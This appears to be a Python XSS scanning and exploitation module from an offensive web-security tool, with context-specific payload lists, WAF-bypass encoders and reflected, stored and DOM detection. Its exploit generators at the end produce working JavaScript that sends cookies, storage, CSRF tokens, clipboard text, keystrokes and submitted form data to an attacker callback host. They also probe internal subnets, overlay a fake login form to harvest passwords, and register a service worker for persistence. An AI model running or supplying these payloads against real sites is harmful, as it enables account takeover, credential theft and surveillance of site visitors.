"""
Advanced XSS (Cross-Site Scripting) Detection Module
Professional exploitation engine with context-aware detection
"""

import re
import random
import hashlib
import time
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
from typing import Optional, Dict, List, Tuple, Set, Any
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.vuln_types import VT
from bs4 import BeautifulSoup
import html
import json
import logging

logger = logging.getLogger(__name__)


class XSSType(Enum):
    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "dom_based"
    UNIVERSAL = "universal"


class ReflectionContext(Enum):
    HTML = "html"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "javascript"
    URL = "url"
    CSS = "css"
    JSON = "json"
    XML = "xml"
    COMMENT = "comment"


@dataclass
class XSSVulnerability:
    url: str
    parameter: str
    xss_type: XSSType
    context: ReflectionContext
    payload: str
    confidence: float
    exploitable: bool
    metadata: Dict = field(default_factory=dict)
    injection_point: str = ""
    encoded: bool = False

    def to_dict(self) -> Dict:
        _SEVERITY = {
            XSSType.STORED:    ("High",   8.0),
            XSSType.REFLECTED: ("Medium", 6.1),
            XSSType.DOM_BASED: ("Medium", 5.4),
            XSSType.UNIVERSAL: ("High",   7.5),
        }
        severity, cvss = _SEVERITY.get(self.xss_type, ("Medium", 6.0))
        if self.exploitable:
            cvss = min(cvss + 1.0, 9.9)
        return {
            "type":        f"XSS ({self.xss_type.value})",
            "xss_type":    self.xss_type.value,
            "context":     self.context.value,
            "url":         self.url,
            "parameter":   self.parameter,
            "payload":     self.payload[:200],
            "confidence":  self.confidence,
            "exploitable": self.exploitable,
            "severity":    severity,
            "cvss":        cvss,
            "encoded":     self.encoded,
            "metadata":    self.metadata,
            "category":    {XSSType.STORED: VT.XSS_STORED, XSSType.UNIVERSAL: VT.XSS_STORED}.get(self.xss_type, VT.XSS),
        }


class ContextAnalyzer:
    """Advanced context detection for precise XSS exploitation"""
    
    @staticmethod
    def detect_context(html_content: str, marker: str) -> List[Tuple[ReflectionContext, str]]:
        """
        Detect all contexts where marker is reflected
        Returns list of (context, surrounding_code) tuples
        """
        contexts = []
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for text_node in soup.find_all(text=True):
            if marker in str(text_node):
                parent = text_node.parent
                if parent and parent.name not in ['script', 'style']:
                    contexts.append((ReflectionContext.HTML, str(text_node)[:200]))
        
        for tag in soup.find_all(True):
            for attr_name, attr_value in tag.attrs.items():
                if isinstance(attr_value, list):
                    attr_value = ' '.join(attr_value)
                
                if marker in str(attr_value):
                    if attr_name.lower() in ['href', 'src', 'action', 'data', 'formaction', 'poster']:
                        contexts.append((ReflectionContext.URL, f'{attr_name}="{attr_value}"'))
                    else:
                        contexts.append((ReflectionContext.ATTRIBUTE, f'{attr_name}="{attr_value}"'))
        
        script_pattern = f'<script[^>]*>.*?{re.escape(marker)}.*?</script>'
        for match in re.finditer(script_pattern, html_content, re.DOTALL | re.IGNORECASE):
            contexts.append((ReflectionContext.JAVASCRIPT, match.group(0)[:200]))
        
        event_pattern = f'(on\\w+)=["\']?[^"\']*{re.escape(marker)}[^"\']*["\']?'
        for match in re.finditer(event_pattern, html_content, re.IGNORECASE):
            contexts.append((ReflectionContext.JAVASCRIPT, match.group(0)))
        
        style_pattern = f'<style[^>]*>.*?{re.escape(marker)}.*?</style>'
        for match in re.finditer(style_pattern, html_content, re.DOTALL | re.IGNORECASE):
            contexts.append((ReflectionContext.CSS, match.group(0)[:200]))
        
        comment_pattern = f'<!--.*?{re.escape(marker)}.*?-->'
        for match in re.finditer(comment_pattern, html_content, re.DOTALL):
            contexts.append((ReflectionContext.COMMENT, match.group(0)[:200]))
        
        json_pattern = f'{{[^}}]*{re.escape(marker)}[^}}]*}}'
        for match in re.finditer(json_pattern, html_content):
            try:
                json.loads(match.group(0))
                contexts.append((ReflectionContext.JSON, match.group(0)[:200]))
            except:
                pass
        
        if '<?xml' in html_content.lower():
            xml_pattern = f'<[^>]*{re.escape(marker)}[^>]*>'
            for match in re.finditer(xml_pattern, html_content):
                contexts.append((ReflectionContext.XML, match.group(0)[:200]))
        
        return contexts
    
    @staticmethod
    def is_encoded(original: str, reflected: str) -> Tuple[bool, str]:
        """
        Check if payload was encoded and identify encoding type
        Returns (is_encoded, encoding_type)
        """
        encodings = {
            'html_entity': html.escape(original),
            'url': quote(original),
            'double_url': quote(quote(original)),
            'unicode': original.encode('unicode_escape').decode('ascii'),
            'hex': ''.join(f'\\x{ord(c):02x}' for c in original),
        }
        
        for enc_type, encoded_value in encodings.items():
            if encoded_value in reflected:
                return True, enc_type
        
        return False, 'none'


class PayloadGenerator:
    """Context-aware XSS payload generation"""
    
    def __init__(self):
        self._cache = {}
    
    def generate_for_context(self, context: ReflectionContext, max_payloads: int = 100) -> List[str]:
        """Generate payloads optimized for specific context"""
        
        cache_key = f"{context.value}_{max_payloads}"
        if cache_key in self._cache:
            return self._cache[cache_key]
        
        if context == ReflectionContext.HTML:
            payloads = self._html_context_payloads()
        elif context == ReflectionContext.ATTRIBUTE:
            payloads = self._attribute_context_payloads()
        elif context == ReflectionContext.JAVASCRIPT:
            payloads = self._javascript_context_payloads()
        elif context == ReflectionContext.URL:
            payloads = self._url_context_payloads()
        elif context == ReflectionContext.CSS:
            payloads = self._css_context_payloads()
        elif context == ReflectionContext.JSON:
            payloads = self._json_context_payloads()
        else:
            payloads = self._universal_payloads()
        
        result = payloads[:max_payloads]
        self._cache[cache_key] = result
        return result
    
    def _html_context_payloads(self) -> List[str]:
        """Payloads for HTML context"""
        return [
            '<script>alert(1)</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(document.cookie)</script>',
            '<script src=//xss.rocks/xss.js></script>',
            
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror=alert(document.domain)>',
            '<img/src=x onerror=alert(1)>',
            '<img src=x:alert(1)>',
            '<img src onerror=alert(1)>',
            
            '<svg/onload=alert(1)>',
            '<svg onload=alert(1)>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><script>alert&#40;1)</script></svg>',
            '<svg/onload=alert(String.fromCharCode(88,83,83))>',
            
            '<body onload=alert(1)>',
            '<body onpageshow=alert(1)>',
            
            '<iframe src=javascript:alert(1)>',
            '<iframe src="data:text/html,<script>alert(1)</script>">',
            '<iframe onload=alert(1)>',
            
            '<object data=javascript:alert(1)>',
            '<embed src=javascript:alert(1)>',
            
            '<form action=javascript:alert(1)><input type=submit>',
            
            '<details open ontoggle=alert(1)>',
            '<details><summary>X</summary><script>alert(1)</script></details>',
            
            '<marquee onstart=alert(1)>',
            
            '<input autofocus onfocus=alert(1)>',
            '<input type=text onfocus=alert(1) autofocus>',
            
            '<select autofocus onfocus=alert(1)>',
            
            '<textarea autofocus onfocus=alert(1)>',
            
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            
            '<link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7D>',
            
            '<keygen autofocus onfocus=alert(1)>',
            
            '<img src=x onerror=alert(1)//',
            '<svg onload=alert(1)//',
            
            # Case variations
            '<ScRiPt>alert(1)</sCrIpT>',
            '<IMG SRC=x ONERROR=alert(1)>',
            '<SvG/OnLoAd=alert(1)>',
            
            '<script\x00>alert(1)</script>',
            '<img\x00src=x onerror=alert(1)>',
            
            '<img\tsrc=x\tonerror=alert(1)>',
            '<img\nsrc=x\nonerror=alert(1)>',
            
            '<script>alert\u00281\u0029</script>',
            
        ]
    
    def _attribute_context_payloads(self) -> List[str]:
        """Payloads for attribute context"""
        return [
            '" onmouseover=alert(1) x="',
            "' onmouseover=alert(1) x='",
            '" autofocus onfocus=alert(1) x="',
            "' autofocus onfocus=alert(1) x='",
            
            ' onmouseover=alert(1) x=',
            ' autofocus onfocus=alert(1) ',
            
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '\'><img src=x onerror=alert(1)>',
            
            '" onclick=alert(1) x="',
            '" onload=alert(1) x="',
            '" onerror=alert(1) x="',
            '" onfocus=alert(1) x="',
            
            '"%20onmouseover=alert(1)%20x="',
            '\'%20onmouseover=alert(1)%20x=\'',
            
            # Double encoding
            '%22%20onmouseover=alert(1)%20x=%22',
            
            'javascript:alert(1)',
            'javascript:alert(document.domain)',
            
            'data:text/html,<script>alert(1)</script>',
            
            '></script><script>alert(1)</script>',
            '></style><script>alert(1)</script>',
            
            # Multiple attributes
            '" onclick=alert(1) onmouseover=alert(2) x="',
        ]
    
    def _javascript_context_payloads(self) -> List[str]:
        """Payloads for JavaScript context"""
        return [
            "';alert(1)//",
            '";alert(1)//',
            "'-alert(1)-'",
            '"-alert(1)-"',
            
            '</script><script>alert(1)</script>',
            '</script><img src=x onerror=alert(1)>',
            
            '${alert(1)}',
            '`${alert(1)}`',
            
            # Comment injection
            '/**/alert(1)//',
            '<!--*/alert(1)//-->',
            
            '\\;alert(1)//',
            '\\x27;alert(1)//',
            '\\u0027;alert(1)//',
            
            ');alert(1)//',
            '});alert(1)//',
            '];alert(1)//',
            
            ',alert(1)//',
            ':alert(1)//',
            
            '+alert(1)+',
            '-alert(1)-',
            '*alert(1)*',
            '/alert(1)/',
            '%alert(1)%',
            
            '||alert(1)||',
            '&&alert(1)&&',
            
            '?alert(1):0',
            
            '[alert(1)]',
            
            '(function(){alert(1)})()',
            
            # Arrow function
            '()=>alert(1)',
            
            'eval(atob("YWxlcnQoMSk="))',
            
            # String concatenation
            'alert(String.fromCharCode(88,83,83))',
            
            'alert\\u0028\\u0031\\u0029',
        ]
    
    def _url_context_payloads(self) -> List[str]:
        """Payloads for URL attribute context"""
        return [
            'javascript:alert(1)',
            'javascript:alert(document.domain)',
            'javascript:alert(document.cookie)',
            'javascript:void(alert(1))',
            
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            
            'JaVaScRiPt:alert(1)',
            'javascript:alert&#40;1&#41;',
            'javascript:alert%281%29',
            
            '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
            
            'java\nscript:alert(1)',
            'java\tscript:alert(1)',
            'java\rscript:alert(1)',
            
            'vbscript:msgbox(1)',
            
            'file:///etc/passwd',
        ]
    
    def _css_context_payloads(self) -> List[str]:
        """Payloads for CSS context"""
        return [
            'expression(alert(1))',
            'x:expression(alert(1))',
            
            '</style><script>alert(1)</script>',
            
            'url(javascript:alert(1))',
            'url("javascript:alert(1)")',
            
            '[class~=alert(1)]',
        ]
    
    def _json_context_payloads(self) -> List[str]:
        """Payloads for JSON context"""
        return [
            '","alert(1)":"',
            '":alert(1),"x":"',
            '"}};alert(1);//',
            '"]};alert(1);//',
        ]
    
    def _universal_payloads(self) -> List[str]:
        """Universal payloads that work in multiple contexts"""
        return [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
            
            '\'"</title></textarea></style></template></noscript></noembed></noframes></script><svg onload=alert()>',
            
            '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(document.cookie)</script>">',
            
            '<svg/onload=alert(1)>',
            '<img src=x onerror=alert(1)>',
            '<script>alert(1)</script>',
        ]
    
    def generate_dom_xss_payloads(self) -> List[str]:
        """Payloads specifically for DOM-based XSS"""
        return [
            '#<script>alert(1)</script>',
            '#<img src=x onerror=alert(1)>',
            
            # Query parameter manipulation
            '?xss=<script>alert(1)</script>',
            
            # document.write exploitation
            '<script>document.write("<img src=x onerror=alert(1)>")</script>',
            
            # innerHTML exploitation  
            '<img src=x onerror=alert(1)>',
            
            'alert(1)',
            
            # Location manipulation
            'javascript:alert(1)',
        ]
    
    def generate_waf_bypass_variants(self, base_payload: str, max_variants: int = 50) -> List[str]:
        """Generate WAF bypass variants of a payload"""
        variants = {base_payload}
        
        variants.add(''.join(c.upper() if random.random() > 0.5 else c.lower() for c in base_payload))
        
        variants.add(quote(base_payload))
        variants.add(quote(quote(base_payload)))
        
        encoded = ''.join(f'&#x{ord(c):02x};' if c.isalpha() else c for c in base_payload)
        variants.add(encoded)
        
        encoded = ''.join(f'&#{ord(c)};' if c.isalpha() else c for c in base_payload)
        variants.add(encoded)
        
        variants.add(base_payload.replace('<', '<\x00'))
        variants.add(base_payload.replace('>', '\x00>'))
        
        # Comment injection
        if '<script>' in base_payload.lower():
            variants.add(base_payload.replace('<script>', '<script\x00>'))
            variants.add(base_payload.replace('<script>', '<script//>'))
            variants.add(base_payload.replace('<script>', '<script\n>'))
            variants.add(base_payload.replace(' ', '/**/'))
        
        variants.add(base_payload.replace('>', ''))
        
        if 'alert' in base_payload:
            variants.add(base_payload.replace('alert', 'ale\\u0072t'))
            variants.add(base_payload.replace('alert', 'al\\x65rt'))
            variants.add(base_payload.replace('alert', 'String.fromCharCode(97,108,101,114,116)'))
        
        return list(variants)[:max_variants]


class StoredXSSDetector:
    """Detection for stored/persistent XSS"""
    
    def __init__(self, http_engine):
        self.http = http_engine
        self.marker_storage = {}
    
    def test_storage_points(self, url: str, forms: List[Dict]) -> List[XSSVulnerability]:
        """Test forms and input points for stored XSS"""
        vulnerabilities = []
        
        for form in forms:
            form_action = form.get('action', url)
            form_method = form.get('method', 'GET').upper()
            inputs = form.get('inputs', [])
            
            if not inputs:
                continue
            
            marker = f"EREBUS_STORED_{hashlib.md5(str(time.time()).encode()).hexdigest()[:12]}"
            
            # Create test payloads with marker
            test_payloads = [
                f'<script>alert("{marker}")</script>',
                f'<img src=x onerror=alert("{marker}")>',
                f'<svg/onload=alert("{marker}")>',
            ]
            
            for payload in test_payloads:
                form_data = {}
                for inp in inputs:
                    inp_name = inp.get('name')
                    if not inp_name:
                        continue
                    
                    inp_type = inp.get('type', 'text')
                    
                    if inp_type in ['submit', 'button', 'reset']:
                        form_data[inp_name] = inp.get('value', '')
                    else:
                        form_data[inp_name] = payload
                
                if form_method == 'POST':
                    submit_resp = self.http.post(form_action, data=form_data)
                else:
                    submit_resp = self.http.get(form_action, params=form_data)
                
                if not submit_resp:
                    continue

                # Re-fetch candidate pages where the stored payload might surface.
                # The submission response itself rarely renders stored content.
                found = False
                for check_url in list(dict.fromkeys([url, form_action])):
                    view_resp = self.http.get(check_url)
                    if not view_resp or marker not in view_resp.text:
                        continue

                    contexts = ContextAnalyzer.detect_context(view_resp.text, marker)
                    if not contexts:
                        continue

                    context, _ = contexts[0]
                    if payload in view_resp.text:
                        vulnerabilities.append(XSSVulnerability(
                            url=form_action,
                            parameter=str(form_data),
                            xss_type=XSSType.STORED,
                            context=context,
                            payload=payload,
                            confidence=0.95,
                            exploitable=True,
                            metadata={
                                'form_method': form_method,
                                'marker': marker,
                                'stored_at': check_url,
                                'inputs': [inp.get('name') for inp in inputs],
                            }
                        ))
                        logger.info(f"Found stored XSS at {check_url}: {payload}")
                        found = True
                        break
                if found:
                    break
        
        return vulnerabilities


class XSSModule:
    """
    Professional XSS Detection Module
    Context-aware detection with intelligent payload generation
    """
    
    def __init__(self, http_engine, evasion_engine=None, callback_url: str = ""):
        self.http = http_engine
        self.evasion = evasion_engine
        self.callback_url = callback_url.rstrip("/") or "https://ATTACKER_SERVER"
        self.payload_gen = PayloadGenerator()
        self.context_analyzer = ContextAnalyzer()
        self.stored_detector = StoredXSSDetector(http_engine)
    
    def scan(self, url: str, test_stored: bool = True, test_dom: bool = True, 
             max_payloads_per_context: int = 50) -> List[XSSVulnerability]:
        """
        Comprehensive XSS scan
        
        Args:
            url: Target URL with parameters
            test_stored: Test for stored XSS
            test_dom: Test for DOM-based XSS
            max_payloads_per_context: Max payloads per context
        
        Returns:
            List of discovered XSS vulnerabilities
        """
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        logger.info(f"Scanning for XSS vulnerabilities in {len(params)} parameters")
        
        for param in params:
            reflected_vulns = self._test_reflected_xss(
                url, 
                param, 
                max_payloads=max_payloads_per_context
            )
            vulnerabilities.extend(reflected_vulns)
        
        if test_stored:
            logger.info("Testing for stored XSS...")
            forms = self._extract_forms(url)
            stored_vulns = self.stored_detector.test_storage_points(url, forms)
            vulnerabilities.extend(stored_vulns)
        
        if test_dom:
            logger.info("Testing for DOM-based XSS...")
            dom_vulns = self._test_dom_xss(url)
            vulnerabilities.extend(dom_vulns)
        
        return vulnerabilities
    
    def _test_reflected_xss(self, url: str, param: str, max_payloads: int = 50) -> List[XSSVulnerability]:
        """Test for reflected XSS with context-aware payloads"""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original_value = params_dict[param][0]
        
        marker = f"EREBUS_XSS_{hashlib.md5(f'{param}{time.time()}'.encode()).hexdigest()[:12]}"
        
        test_params = params_dict.copy()
        test_params[param] = [marker]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
        
        resp = self.http.get(test_url)
        if not resp or marker not in resp.text:
            logger.debug(f"Parameter '{param}' not reflected")
            return vulnerabilities
        
        contexts = self.context_analyzer.detect_context(resp.text, marker)
        
        if not contexts:
            logger.debug(f"Marker found but context detection failed for '{param}'")
            return vulnerabilities
        
        logger.info(f"Parameter '{param}' reflected in {len(contexts)} context(s): {[c[0].value for c in contexts]}")
        
        for context, surrounding in contexts:
            is_encoded, encoding_type = self.context_analyzer.is_encoded(marker, surrounding)
            
            if is_encoded:
                logger.info(f"Reflection is {encoding_type} encoded in {context.value} context")
            
            payloads = self.payload_gen.generate_for_context(context, max_payloads=max_payloads)
            
            batch_size = 20
            for i in range(0, len(payloads), batch_size):
                batch = payloads[i:i+batch_size]
                
                for payload in batch:
                    test_params = params_dict.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    resp = self.http.get(test_url)
                    if not resp:
                        continue
                    
                    if payload in resp.text:
                        # Additional verification: check if it's in executable position
                        if self._verify_xss_execution(resp.text, payload, context):
                            vulnerabilities.append(XSSVulnerability(
                                url=url,
                                parameter=param,
                                xss_type=XSSType.REFLECTED,
                                context=context,
                                payload=payload,
                                confidence=0.95,
                                exploitable=True,
                                metadata={
                                    'encoding': encoding_type,
                                    'surrounding': surrounding[:100]
                                }
                            ))
                            logger.info(f"✓ Found reflected XSS in '{param}' ({context.value}): {payload[:50]}")
                            break  # Found working payload for this context
                    
                    elif self._check_partial_reflection(resp.text, payload):
                        vulnerabilities.append(XSSVulnerability(
                            url=url,
                            parameter=param,
                            xss_type=XSSType.REFLECTED,
                            context=context,
                            payload=payload,
                            confidence=0.70,
                            exploitable=False,
                            metadata={
                                'encoding': encoding_type,
                                'note': 'Partial reflection detected'
                            }
                        ))
        
        return vulnerabilities
    
    def _verify_xss_execution(self, _html: str, payload: str, context: ReflectionContext) -> bool:
        """Verify that XSS payload would actually execute in its reflection context."""
        payload_lower = payload.lower()

        if context == ReflectionContext.HTML:
            executable_tags = [
                'script', 'img', 'svg', 'iframe', 'object', 'embed',
                'body', 'details', 'marquee', 'input', 'video', 'audio',
            ]
            return any(f'<{tag}' in payload_lower for tag in executable_tags)

        elif context == ReflectionContext.ATTRIBUTE:
            event_handlers = [
                'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus',
                'onkeyup', 'onkeydown', 'onchange', 'onsubmit', 'onfocusin',
                'onpageshow', 'ontoggle', 'onstart',
            ]
            return any(h in payload_lower for h in event_handlers)

        elif context == ReflectionContext.JAVASCRIPT:
            return True

        elif context == ReflectionContext.URL:
            return 'javascript:' in payload_lower or 'data:' in payload_lower

        elif context == ReflectionContext.CSS:
            css_exec = ['expression(', 'javascript:', 'url(javascript:', '</style>']
            return any(p in payload_lower for p in css_exec)

        return False
    
    def _check_partial_reflection(self, html_content: str, payload: str) -> bool:
        """Check if injection-specific syntax from THIS payload is reflected."""
        payload_lower = payload.lower()
        injection_markers = [
            m for m in [
                'onerror=', 'onload=', 'onclick=', 'onmouseover=', 'onfocus=',
                'javascript:', '</script>', 'expression(',
            ]
            if m in payload_lower
        ]
        if not injection_markers:
            return False
        html_lower = html_content.lower()
        return all(m in html_lower for m in injection_markers)
    
    def _test_dom_xss(self, url: str) -> List[XSSVulnerability]:
        """Test for DOM-based XSS"""
        vulnerabilities = []
        
        resp = self.http.get(url)
        if not resp:
            return vulnerabilities
        
        dangerous_patterns = [
            r'document\.write\([^)]*location',
            r'innerHTML\s*=\s*[^)]*location',
            r'eval\([^)]*location',
            r'setTimeout\([^)]*location',
            r'setInterval\([^)]*location',
            r'\.html\([^)]*location',
            r'document\.location\s*=',
            r'window\.location\s*=',
        ]
        
        for pattern in dangerous_patterns:
            matches = re.findall(pattern, resp.text, re.IGNORECASE)
            if matches:
                vulnerabilities.append(XSSVulnerability(
                    url=url,
                    parameter='DOM',
                    xss_type=XSSType.DOM_BASED,
                    context=ReflectionContext.JAVASCRIPT,
                    payload='#<img src=x onerror=alert(1)>',
                    confidence=0.35,
                    exploitable=False,
                    metadata={
                        'pattern': pattern,
                        'matches': matches[:3],
                        'note': 'Potential DOM sink — manual verification required',
                    }
                ))
        
        return vulnerabilities
    
    def _extract_forms(self, url: str) -> List[Dict]:
        """Extract forms from page"""
        resp = self.http.get(url)
        if not resp:
            return []
        
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            action = form.get('action', '')
            if action.startswith('/'):
                parsed = urlparse(url)
                action = f"{parsed.scheme}://{parsed.netloc}{action}"
            elif not action.startswith('http'):
                action = url
            
            method = form.get('method', 'GET').upper()
            
            inputs = []
            for inp in form.find_all(['input', 'textarea', 'select']):
                inputs.append({
                    'name': inp.get('name'),
                    'type': inp.get('type', 'text'),
                    'value': inp.get('value', '')
                })
            
            forms.append({
                'action': action,
                'method': method,
                'inputs': inputs
            })
        
        return forms
    
    def exploit(self, vulnerability: XSSVulnerability) -> str:
        """Generate exploitation code for XSS vulnerability"""
        
        base_payload = vulnerability.payload
        
        if vulnerability.xss_type == XSSType.REFLECTED:
            exploit = self._generate_reflected_exploit(vulnerability)
        elif vulnerability.xss_type == XSSType.STORED:
            exploit = self._generate_stored_exploit(vulnerability)
        elif vulnerability.xss_type == XSSType.DOM_BASED:
            exploit = self._generate_dom_exploit(vulnerability)
        else:
            exploit = base_payload
        
        return exploit
    
    def _generate_reflected_exploit(self, vuln: XSSVulnerability) -> str:
        cb = self.callback_url
        return f'''<script>
(function(){{
    var d=document,cb='{cb}';

    // Session + storage dump
    fetch(cb+'/c',{{method:'POST',mode:'no-cors',body:JSON.stringify({{
        c:d.cookie,ls:JSON.stringify(localStorage),ss:JSON.stringify(sessionStorage),
        u:location.href,r:d.referrer,ua:navigator.userAgent
    }})}});

    // CSRF token extraction from meta/input
    var csrf=(d.querySelector('meta[name*="csrf"]')||d.querySelector('input[name*="csrf"]'));
    if(csrf)fetch(cb+'/csrf?t='+encodeURIComponent(csrf.content||csrf.value),{{mode:'no-cors'}});

    // Clipboard theft (requires focus — fires on paste/copy events)
    d.addEventListener('copy',function(){{navigator.clipboard&&navigator.clipboard.readText().then(function(t){{fetch(cb+'/clip?d='+encodeURIComponent(t),{{mode:'no-cors'}})}});}});

    // Keylogger attached to all inputs
    var buf='';
    d.addEventListener('keydown',function(e){{
        buf+=e.key;
        if(buf.length>80){{fetch(cb+'/k?d='+encodeURIComponent(buf),{{mode:'no-cors'}});buf='';}}
    }});

    // Form credential interception
    d.querySelectorAll('form').forEach(function(f){{
        f.addEventListener('submit',function(){{
            fetch(cb+'/form',{{method:'POST',mode:'no-cors',body:new URLSearchParams(new FormData(f)).toString()}});
        }},true);
    }});

    // Internal network port scan via fetch timing
    var subnets=['192.168.1.','10.0.0.','172.16.0.'];
    subnets.forEach(function(s){{
        [1,254].forEach(function(i){{
            var t=Date.now();
            fetch('http://'+s+i,{{mode:'no-cors',signal:AbortSignal.timeout(500)}})
                .catch(function(){{
                    var lat=Date.now()-t;
                    if(lat<400)fetch(cb+'/lan?h='+s+i+'&ms='+lat,{{mode:'no-cors'}});
                }});
        }});
    }});

    // Credential phishing overlay injected over the current page
    var ov=d.createElement('div');
    ov.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999;display:flex;align-items:center;justify-content:center"><form style="background:#f5f5f5;padding:40px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.2);min-width:320px" onsubmit="event.preventDefault();var u=this.querySelector(\'[name=u]\').value,p=this.querySelector(\'[name=p]\').value;fetch(\'{cb}/creds\',{{method:\'POST\',mode:\'no-cors\',body:JSON.stringify({{u:u,p:p,origin:location.href}})}});this.parentElement.parentElement.remove()"><h2 style="margin:0 0 20px;font-family:sans-serif">Session expired — please re-authenticate</h2><input name=u type=email placeholder=Email style="display:block;width:100%;padding:10px;margin:0 0 12px;box-sizing:border-box;border:1px solid #ccc;border-radius:4px"><input name=p type=password placeholder=Password style="display:block;width:100%;padding:10px;margin:0 0 20px;box-sizing:border-box;border:1px solid #ccc;border-radius:4px"><button style="background:#1a73e8;color:#fff;border:none;padding:12px 24px;border-radius:4px;width:100%;cursor:pointer">Sign in</button></form></div>';
    d.body.appendChild(ov);
}})();
</script>'''

    def _generate_stored_exploit(self, vuln: XSSVulnerability) -> str:
        cb = self.callback_url
        return f'''<script>
(function(){{
    var d=document,cb='{cb}',key='_x_beacon';
    if(sessionStorage.getItem(key))return;
    sessionStorage.setItem(key,'1');

    // Full session dump on every victim visit
    fetch(cb+'/beacon',{{method:'POST',mode:'no-cors',body:JSON.stringify({{
        c:d.cookie,ls:JSON.stringify(localStorage),ss:JSON.stringify(sessionStorage),
        u:location.href,r:d.referrer,ua:navigator.userAgent,ts:Date.now()
    }})}});

    // Persistent keylogger + form hijack
    var buf='';
    d.addEventListener('keydown',function(e){{
        buf+=e.key;
        if(buf.length>120){{fetch(cb+'/k?d='+encodeURIComponent(buf),{{mode:'no-cors'}});buf='';}}
    }});
    d.querySelectorAll('form').forEach(function(f){{
        f.addEventListener('submit',function(){{
            fetch(cb+'/form',{{method:'POST',mode:'no-cors',body:new URLSearchParams(new FormData(f)).toString()}});
        }},true);
    }});

    // Periodic heartbeat with current DOM snapshot (catches SPA navigation)
    setInterval(function(){{
        fetch(cb+'/hb?u='+encodeURIComponent(location.href),{{mode:'no-cors'}});
    }},30000);

    // Attempt to read clipboard on user interaction
    d.addEventListener('click',function(){{
        navigator.clipboard&&navigator.clipboard.readText().then(function(t){{
            if(t)fetch(cb+'/clip?d='+encodeURIComponent(t),{{mode:'no-cors'}});
        }}).catch(function(){{}});
    }},{{once:true}});

    // Service worker registration for persistence across navigations
    if('serviceWorker' in navigator){{
        var swSrc='self.addEventListener("fetch",function(e){{}});';
        var blob=new Blob([swSrc],{{type:'application/javascript'}});
        var swUrl=URL.createObjectURL(blob);
        navigator.serviceWorker.register(swUrl,{{scope:'/'}}).catch(function(){{}});
    }}
}})();
</script>'''
    
    def _generate_dom_exploit(self, vuln: XSSVulnerability) -> str:
        """Generate DOM-based XSS exploit"""
        
        return vuln.payload